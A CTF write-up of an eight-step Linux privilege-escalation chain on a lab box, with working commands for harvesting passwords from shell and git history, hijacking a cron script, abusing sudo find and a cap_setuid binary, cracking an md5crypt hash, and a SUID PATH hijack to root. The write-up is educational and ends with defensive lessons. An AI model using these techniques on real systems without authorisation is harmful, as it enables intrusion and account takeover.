# Eight Steps From a Service Account to Root

**Subtitle:** A DeadFace CTF privilege-escalation chain on one Linux box, where every step is a different real-world misconfiguration — history files, git logs, cron, sudo, capabilities, a cracked password, and finally a PATH hijack.

This was the challenge I'm proudest of from DeadFace CTF 2026, and the one I'd point a recruiter at. "Charon" is DeadFace's internal ops box, reached through a browser web-shell. You land on it as a low-privilege service account and climb, one user at a time, all the way to root. Each account's flag is its own sub-challenge, and — this is the nice part — each step also hands you the credential or technique for the next. Strung together, it reads like a checklist of the Linux privesc mistakes you actually see in the wild.

Here's the whole ladder before the details:

| Step | Account reached | How |
|---|---|---|
| 1 | `svc-deploy` | enumerate the home directory |
| 2 | `deephax` | password left in `~/.bash_history` |
| 3 | `gh0st404` | secret in git history |
| 4 | `sunstalker` | a writable script run by cron |
| 5 | `lilith` | `sudo find` (GTFOBins) |
| 6 | `spookyboi` | a Linux capability on a binary |
| 7 | `mort1cia` | cracking an md5crypt password with an OSINT wordlist |
| 8 | `root` | SUID binary PATH hijack |

## Step 1 — Foothold (10 pts)

Getting the web-shell to stay up was its own small fight (it kept dropping with a 502, and a browser setting was blocking the popup), but once it loaded, the foothold was pure orientation:

```bash
whoami; id; pwd; ls -la; cat flag*
# svc-deploy, /home/svc-deploy
# flag.txt -> deadface{f00th0ld_p4st_th3_v31l}
```

## Step 2 — Looking Back (30 pts)

The title points at history, and `~/.bash_history` held a password-reset command. The attempt to clear it was itself recorded:

```bash
cat ~/.bash_history
# echo "deephax:Sk4t3rB0y_S1nce_2011" | sudo chpasswd
# history -c
```

```bash
su - deephax -c 'cat ~/flag.txt'   # password: Sk4t3rB0y_S1nce_2011
# deadface{sh3ll_h1st0ry_t3lls_4ll}
```

## Step 3 — Git Good (100 pts)

`deephax`'s home had a git repo whose current `config.py` moved a password into an environment variable — but git history kept the old version. The "scrub" commit diff showed exactly what was removed:

```bash
cd ~/kingmaker-scraper && git --no-pager show <scrub-commit>
#  SERVICE_USER = "gh0st404"
# -SERVICE_PW   = "Gh0stInTh3Sh3ll_404"
# +SERVICE_PW   = os.environ.get("SCRAPER_PW", "")
```

```bash
su - gh0st404 -c 'cat ~/flag.txt'   # password: Gh0stInTh3Sh3ll_404
# deadface{g1t_l0g_sp1lls_s3cr3ts}
```

## Step 4 — On Schedule (200 pts)

A cron entry ran `gh0st404`'s script as `sunstalker` every minute, and `gh0st404` owned the script (so it was writable):

```bash
cat /etc/cron.d/charon-collect
# * * * * * sunstalker /opt/scrape/collect.sh
ls -l /opt/scrape/collect.sh   # -rwxr-xr-x gh0st404 gh0st404
```

Appending a payload made cron run it as `sunstalker`, copying that user's flag somewhere readable:

```bash
su - gh0st404 -c 'printf "\ncat /home/sunstalker/flag.txt > /tmp/sun_flag.txt\nchmod 666 /tmp/sun_flag.txt\n" >> /opt/scrape/collect.sh'
# wait ~60s for cron, then:
cat /tmp/sun_flag.txt   # deadface{cr0n_c4rr13d_my_p4yl04d}
```

## Step 5 — Lilith (250 pts)

Using that same cron-as-`sunstalker` primitive, `sudo -l` revealed a narrow permission:

```
(lilith) NOPASSWD: /usr/bin/find
```

`find` can run commands with `-exec`, so running it as `lilith` reads `lilith`'s files as `lilith` — a classic GTFOBins move:

```bash
sudo -n -u lilith /usr/bin/find /home/lilith -maxdepth 1 -type f -exec cat {} + \
  > /tmp/lilith_flag.txt 2>&1; chmod 666 /tmp/lilith_flag.txt
# deadface{sud0_f1nd_4_w4y_1n}
```

A note in lilith's home pointed onward: "spookyboi has the decryption tooling."

## Step 6 — Dangerous Capability (300 pts)

A scan for file capabilities found one custom binary with a capability it should never have had:

```bash
getcap -r / 2>/dev/null
# /opt/crypto/cryptctl cap_setuid=ep
```

`cap_setuid` lets a process change its UID. `cryptctl` drops into a shell as the "crypto service identity" — `spookyboi`:

```bash
/opt/crypto/cryptctl       # -> shell as spookyboi
id                         # uid=1006(spookyboi)
cat /home/spookyboi/flag.txt
# deadface{c4p_s3tu1d_cuts_d33p}
```

## Step 7 — Old Habits (350 pts)

`spookyboi`'s backup held `mort1cia`'s password hash and a pointer to her posting history:

```
mort1cia:$1$de4df4ce$1pZYBMgWLPXg1tZo6pke20   # md5crypt, salt 'de4df4ce'
```

This was the long one. The hash wasn't in rockyou (I tested all 14.3M entries) and resisted my themed guesses, so it needed OSINT. The forum established her nickname as "princess" (from an old Halloween photo), and a sourdough thread named a starter "Gary" (a red herring, as it turned out). With no rockyou hit, I brute-forced the strongest base words against the exact hash with a small compiled `crypt(3)` cracker, appending digit suffixes:

```c
// mc.c — fast md5crypt comparator using glibc crypt_r
char *h = crypt_r(line, "$1$de4df4ce", &data);
if (!strcmp(h, target)) printf("MATCH: %s\n", line);
```

```bash
# candidates: {gary, princess, pinkprincess, ...} + digits 0-99999
./mc < numbrute.txt
# MATCH: princess2015
```

```bash
su - mort1cia -c 'cat ~/flag.txt'   # password: princess2015
# deadface{0s1nt_n3v3r_f0rg3ts}
```

The flag name is the lesson: the full rockyou run is what *proved* the password wasn't a generic breach entry, which is exactly what justified switching to a targeted OSINT wordlist.

## Step 8 — Heavy is the Crown (500 pts)

Only root was left. `mort1cia` had no sudo, but there was a custom SUID-root binary, `/usr/local/bin/charon-backup`. Its strings showed it calling `tar` by name — not by absolute path — through `system()`:

```bash
strings /usr/local/bin/charon-backup
# tar czf /var/backups/charon-ops.tgz -C /opt ops 2>/dev/null
# system  /bin/sh
```

Because it calls `tar` by name, a PATH hijack works: put a fake `tar` first on PATH, and the SUID-root process runs it as root.

```bash
su - mort1cia -c '
  mkdir -p /tmp/pwn
  echo "#!/bin/sh" > /tmp/pwn/tar
  echo "cat /root/flag.txt > /tmp/rootflag.txt 2>&1; id >> /tmp/rootflag.txt; chmod 666 /tmp/rootflag.txt" >> /tmp/pwn/tar
  chmod +x /tmp/pwn/tar
  PATH=/tmp/pwn:$PATH /usr/local/bin/charon-backup
  cat /tmp/rootflag.txt'
```

Output:

```
uid=0(root) gid=0(root) groups=1007(mort1cia)
deadface{p4th_h1j4ck3d_t0_thr0n3}
```

Root.

## Why the whole chain works

Each rung is a separate, real misconfiguration. Secrets get left in shell history and git history. A world-writable script gets executed by another user's cron. A sudo rule hands over a binary (`find`) that can spawn arbitrary commands. A file capability (`cap_setuid`) gives a tool powers it was never meant to have. A password that survives rockyou still falls to a targeted OSINT wordlist. And a SUID binary calls a helper by relative name, letting PATH decide which binary actually runs as root. None of these is exotic on its own — the challenge just lines them up so you have to recognise and chain all eight.

## What I took from it

If I had to compress the whole box into an enumeration order, it would be: history files, git logs, cron jobs, `sudo -l`, SUID binaries (`find / -perm -4000`), and `getcap -r /`. GTFOBins is the reference that turns an "allowed" binary into code execution. On the defensive side, SUID programs must call helpers by absolute path and sanitise PATH — `system()` inside a SUID binary is almost always a bug — and personal passwords fall to targeted wordlists even when they survive the big generic lists, so reuse across a forum profile and a login is a real risk, not a theoretical one.

This chain is the piece of the CTF I learned the most from, because it wasn't one trick — it was eight, and the skill was knowing which to look for next.

---

